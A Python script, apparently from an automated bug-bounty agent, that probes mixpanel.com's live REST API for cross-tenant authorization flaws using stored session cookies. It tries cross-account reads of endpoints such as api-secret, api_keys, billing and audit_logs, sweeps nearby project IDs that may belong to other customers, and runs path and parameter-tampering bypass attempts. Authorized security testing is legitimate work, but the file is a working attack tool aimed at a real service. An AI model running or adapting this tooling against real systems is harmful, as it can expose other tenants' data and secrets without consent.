#!/usr/bin/env python3
"""Mixpanel cross-tenant IDOR / BOLA hunter.
Tests project-scoped & org-scoped REST endpoints with ADMIN vs IDOR sessions.
Captures differential responses; flags suspect cross-tenant reads.
"""
import sys, os, json, time, hashlib
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

sh = SafeHttp(allow_raw_for_waf=True)
TARGET = 'mixpanel'
TOK = json.load(open(f'/home/hunter/new_agent/targets/{TARGET}/recon/tokens.json'))

LOG = f'/home/hunter/new_agent/targets/{TARGET}/notes/session-log.md'
QUEUE = '/home/hunter/new_agent/state/queue.jsonl'
RES_DIR = f'/home/hunter/new_agent/results/{TARGET}'
os.makedirs(RES_DIR, exist_ok=True)

def log(msg):
    with open(LOG, 'a') as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] ATTACK-IDOR: {msg}\n")

def emit(event, **kw):
    entry = {"event": event, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ"), **kw}
    with open(QUEUE, 'a') as f:
        f.write(json.dumps(entry) + '\n')

def headers_for(role):
    t = TOK[role]
    return {
        "Cookie": t['full_cookies'],
        "X-CSRFToken": t['csrf'],
        "Authorization": "Session",
        "Referer": "https://mixpanel.com/",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Bug-Bounty-Scope-Mixpanel",
        "Accept": "application/json, text/plain, */*",
    }

# Project IDs
ADMIN_PROJECTS = [4025923, 4025962, 4027263, 4027269]
IDOR_PROJECT = 4025942
MEMBER_PROJECT = 4025974
ADMIN_ORG = 3100781
IDOR_ORG = 3100795
MEMBER_ORG = 3100810

# Endpoints to test: relative paths under project scope.
PROJECT_ENDPOINTS = [
    "dashboards", "cohorts", "webhooks", "users", "service_accounts",
    "api-secret", "secret", "api-token", "lookup_tables", "bookmarks",
    "audit_logs", "lexicon", "data_definitions", "exports", "gdpr",
    "data_deletion", "custom_alerts", "feature_flags", "warehouse_sources",
    "embeds", "share", "themes", "heat_maps", "playlists",
    "info", "settings", "notifications", "members",
    "events", "people", "funnels", "retention", "flows", "insights",
    "reports", "annotations", "tags", "favorites",
]

ORG_ENDPOINTS = [
    "", "users", "projects", "audit_logs", "billing", "invoices",
    "members", "invitations", "subscription", "plans", "settings",
    "service_accounts", "saml", "sso", "scim", "api_keys",
    "domains", "feature_flags",
]

# Test results store
results = []

def fingerprint(text):
    return hashlib.sha256(text.encode('utf-8', 'replace')).hexdigest()[:16]

def test_get(url, role, tag=""):
    """Issue GET, capture status/len/body-hash/snippet."""
    try:
        r = sh.request("GET", url, headers=headers_for(role), timeout=15)
        body = r.text[:500] if r.text else ""
        return {
            "url": url, "role": role, "method": "GET",
            "status": r.status_code, "len": len(r.text or ""),
            "fp": fingerprint(r.text or ""),
            "ct": r.headers.get("Content-Type", ""),
            "snippet": body[:300],
            "location": r.headers.get("Location", ""),
            "tag": tag,
        }
    except Exception as e:
        return {"url": url, "role": role, "method": "GET", "status": -1, "error": str(e)[:120], "tag": tag}

def compare_and_flag(victim_resp, attacker_resp, idor_baseline=None):
    """Detect cross-tenant IDOR.
    Real bug: attacker (no relationship to project) returns 200 with substantive body
    AND the body matches what the legitimate owner sees.
    """
    if attacker_resp.get("status") != 200:
        return None
    # If attacker hit redirects with 302 -> request_access -> not vulnerable.
    if "request_access" in (attacker_resp.get("location") or ""):
        return None
    if attacker_resp.get("len", 0) < 20:
        return None
    # Compare to owner's baseline
    if idor_baseline and idor_baseline.get("status") == 200:
        if attacker_resp["fp"] == idor_baseline["fp"]:
            return "EXACT_MATCH_OWNER_DATA"
        # Different bodies but both 200 — owner sees own, attacker sees own → not IDOR
        # Owner-only data present in attacker response → IDOR
    if attacker_resp.get("len", 0) > 200 and attacker_resp.get("ct","").startswith("application/json"):
        return "SUSPICIOUS_200_JSON"
    return None

print("=== Mixpanel Cross-Tenant IDOR Hunter ===")
log(f"BEGIN session. ADMIN_PROJ={ADMIN_PROJECTS[0]}, IDOR_PROJ={IDOR_PROJECT}, MEMBER_PROJ={MEMBER_PROJECT}")

# Phase 1: Baseline — each role reads OWN project for each endpoint
print("\n--- PHASE 1: Self-baseline ---")
baselines = {}  # key: (role, ep) -> response
for ep in PROJECT_ENDPOINTS:
    for role, pid in [("ADMIN", ADMIN_PROJECTS[0]), ("IDOR", IDOR_PROJECT), ("MEMBER", MEMBER_PROJECT)]:
        url = f"https://mixpanel.com/api/app/projects/{pid}/{ep}"
        r = test_get(url, role, tag="baseline")
        baselines[(role, ep)] = r
        status = r["status"]
        print(f"  {role:6s} → own/{ep:25s} → {status} len={r.get('len','?')}")
        if status == 200 and r.get("len", 0) > 50:
            log(f"BASELINE {role} own project {ep}: 200 len={r['len']}")
        time.sleep(0.3)
    time.sleep(0.2)

# Phase 2: Cross-tenant — ADMIN session reads IDOR's project, vice versa
print("\n--- PHASE 2: Cross-tenant ---")
xtest = []  # list of (attacker_role, victim_role, victim_pid, ep, response)
for ep in PROJECT_ENDPOINTS:
    # ADMIN session targeting IDOR's project
    url_a = f"https://mixpanel.com/api/app/projects/{IDOR_PROJECT}/{ep}"
    ra = test_get(url_a, "ADMIN", tag=f"xt:ADMIN->IDOR/{ep}")
    xtest.append(("ADMIN", "IDOR", IDOR_PROJECT, ep, ra))
    # IDOR session targeting ADMIN's project
    url_b = f"https://mixpanel.com/api/app/projects/{ADMIN_PROJECTS[0]}/{ep}"
    rb = test_get(url_b, "IDOR", tag=f"xt:IDOR->ADMIN/{ep}")
    xtest.append(("IDOR", "ADMIN", ADMIN_PROJECTS[0], ep, rb))
    # MEMBER session reaching either
    url_c = f"https://mixpanel.com/api/app/projects/{ADMIN_PROJECTS[0]}/{ep}"
    rc = test_get(url_c, "MEMBER", tag=f"xt:MEMBER->ADMIN/{ep}")
    xtest.append(("MEMBER", "ADMIN", ADMIN_PROJECTS[0], ep, rc))

    # Flag
    for (atk, vic, pid, e, resp) in [("ADMIN","IDOR",IDOR_PROJECT,ep,ra),
                                     ("IDOR","ADMIN",ADMIN_PROJECTS[0],ep,rb),
                                     ("MEMBER","ADMIN",ADMIN_PROJECTS[0],ep,rc)]:
        baseline = baselines.get((vic, e))
        flag = compare_and_flag(None, resp, baseline)
        marker = ""
        if flag:
            marker = f" *** {flag} ***"
        s = resp.get("status")
        print(f"  {atk:6s}→{vic:6s} /{e:25s} → {s} len={resp.get('len','?')} loc={(resp.get('location') or '')[:30]}{marker}")
        if flag:
            log(f"FLAG {flag}: {atk}→{vic} GET {resp['url']} status={s} len={resp.get('len')}")
            emit("idor_candidate", url=resp['url'], attacker=atk, victim=vic, status=s, flag=flag)
            results.append({"phase":"xtest", "atk":atk, "vic":vic, "url":resp['url'],
                            "status":s, "len":resp.get('len'), "snippet":resp.get('snippet','')[:300],
                            "baseline_status": baseline.get('status') if baseline else None,
                            "baseline_len": baseline.get('len') if baseline else None,
                            "flag":flag})
    time.sleep(0.2)

# Phase 3: ORG-scoped — find pattern first
print("\n--- PHASE 3: Org-scoped discovery ---")
# Discover org-scoped path pattern
for base in [f"https://mixpanel.com/api/app/organizations/{ADMIN_ORG}",
             f"https://mixpanel.com/api/app/orgs/{ADMIN_ORG}",
             f"https://mixpanel.com/api/2.0/organizations/{ADMIN_ORG}"]:
    r = test_get(base, "ADMIN", tag="org-discover")
    print(f"  discover ADMIN→own_org: {base} → {r['status']} len={r.get('len','?')}")
    if r['status'] == 200 and r.get('len',0) > 100:
        log(f"ORG-PATTERN: {base} works for ADMIN, status=200")
        break
    time.sleep(0.5)

# Try cross-tenant org reads using best-guess pattern
for ep in ORG_ENDPOINTS:
    for base_template in [
        "https://mixpanel.com/api/app/organizations/{oid}",
        "https://mixpanel.com/api/app/orgs/{oid}",
    ]:
        # ADMIN reading IDOR's org
        url = base_template.format(oid=IDOR_ORG) + ("/" + ep if ep else "")
        r = test_get(url, "ADMIN", tag=f"xt-org:ADMIN->IDOR/{ep}")
        s = r['status']
        marker = ""
        if s == 200 and r.get('len',0) > 200 and "request_access" not in (r.get('location') or ''):
            marker = " *** ORG-CROSS-TENANT 200 ***"
            log(f"ORG-FLAG: ADMIN→IDOR_ORG {url} status=200 len={r['len']}")
            emit("idor_candidate", url=url, attacker="ADMIN", victim="IDOR_ORG", status=200)
            results.append({"phase":"org-xt", "atk":"ADMIN", "vic":"IDOR_ORG",
                            "url":url, "status":s, "len":r.get('len'),
                            "snippet":r.get('snippet','')[:300], "flag":"ORG_CROSS"})
        print(f"  ADMIN→IDOR_ORG {ep or '(root)':20s} → {s} len={r.get('len','?')}{marker}")
        time.sleep(0.25)
        if s == 200 and r.get('len',0) > 50:
            break  # pattern works, no need to retry alt

# Phase 4: Project-ID sweep — try nearby integer IDs (sequential ID prediction)
print("\n--- PHASE 4: Project ID sweep ---")
sweep_targets = [4025923, 4025924, 4025925, 4025930, 4025940, 4025941, 4025942, 4025943,
                 4025950, 4025960, 4025961, 4025962, 4025970, 4025974, 4025980, 4026000,
                 4027000, 4027262, 4027263, 4027264, 4027268, 4027269, 4027270]
sweep_hits = []
for pid in sweep_targets:
    url = f"https://mixpanel.com/api/app/projects/{pid}/dashboards"
    r = test_get(url, "ADMIN", tag=f"sweep:{pid}")
    s = r['status']
    loc = r.get('location','') or ''
    if s == 200 and r.get('len',0) > 50 and 'request_access' not in loc:
        sweep_hits.append((pid, s, r.get('len')))
        print(f"  *** SWEEP HIT: pid={pid} status=200 len={r['len']}")
        log(f"SWEEP-HIT: ADMIN→pid={pid} dashboards 200 len={r['len']}")
        emit("idor_candidate", url=url, attacker="ADMIN", victim=f"pid_{pid}", status=200)
    else:
        print(f"  sweep pid={pid:8d} → {s} len={r.get('len','?')} loc={loc[:40]}")
    time.sleep(0.3)

# Phase 5: HPP / JSON body / method-tampering on /dashboards as control
print("\n--- PHASE 5: Bypass attempts on /dashboards (cross-tenant) ---")
bypass_urls = [
    f"https://mixpanel.com/api/app/projects/{IDOR_PROJECT}/dashboards?project_id={ADMIN_PROJECTS[0]}",
    f"https://mixpanel.com/api/app/projects/{IDOR_PROJECT}/dashboards.json",
    f"https://mixpanel.com/api/app/projects/{IDOR_PROJECT}/dashboards/",
    f"https://mixpanel.com/api/app/projects/{IDOR_PROJECT}//dashboards",
    f"https://mixpanel.com/api/app/projects/{IDOR_PROJECT}/dashboards;",
    f"https://mixpanel.com/api/app/projects/{IDOR_PROJECT}/dashboards%20",
    f"https://mixpanel.com/api/app/projects/{IDOR_PROJECT}/dashboards/.",
    f"https://mixpanel.com/api/internal/projects/{IDOR_PROJECT}/dashboards",
    f"https://mixpanel.com/api/_internal/projects/{IDOR_PROJECT}/dashboards",
    f"https://mixpanel.com/api/v1/projects/{IDOR_PROJECT}/dashboards",
    f"https://mixpanel.com/api/v2/projects/{IDOR_PROJECT}/dashboards",
    f"https://mixpanel.com/api/v0/projects/{IDOR_PROJECT}/dashboards",
    f"https://mixpanel.com/api/2.0/projects/{IDOR_PROJECT}/dashboards",
    f"https://mixpanel.com/api/app/projects/{ADMIN_PROJECTS[0]}/dashboards?project_id={IDOR_PROJECT}",
    f"https://mixpanel.com/api/app/projects/{ADMIN_PROJECTS[0]}/dashboards?project_id={IDOR_PROJECT}&project_id={ADMIN_PROJECTS[0]}",
]
for url in bypass_urls:
    r = test_get(url, "ADMIN", tag="bypass")
    s = r['status']
    loc = r.get('location','') or ''
    marker = ""
    if s == 200 and r.get('len',0) > 50 and 'request_access' not in loc:
        marker = " *** BYPASS-HIT ***"
        log(f"BYPASS-HIT: ADMIN {url} status=200 len={r['len']}")
        emit("idor_candidate", url=url, attacker="ADMIN", flag="BYPASS")
        results.append({"phase":"bypass", "url":url, "status":s, "len":r.get('len'),
                        "snippet":r.get('snippet','')[:300], "flag":"BYPASS"})
    print(f"  bypass {url[-80:]:80s} → {s}{marker}")
    time.sleep(0.3)

# Save raw results
out = f"{RES_DIR}/idor-{int(time.time())}.json"
with open(out, 'w') as f:
    json.dump({"results": results, "baselines_count": len(baselines),
               "xtests_count": len(xtest), "sweep_hits": sweep_hits,
               "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ")}, f, indent=2)
print(f"\nResults saved to {out}")
print(f"Flagged: {len(results)} suspect responses")
print(f"Sweep hits: {len(sweep_hits)}")
log(f"END session. flagged={len(results)} sweep_hits={len(sweep_hits)}")
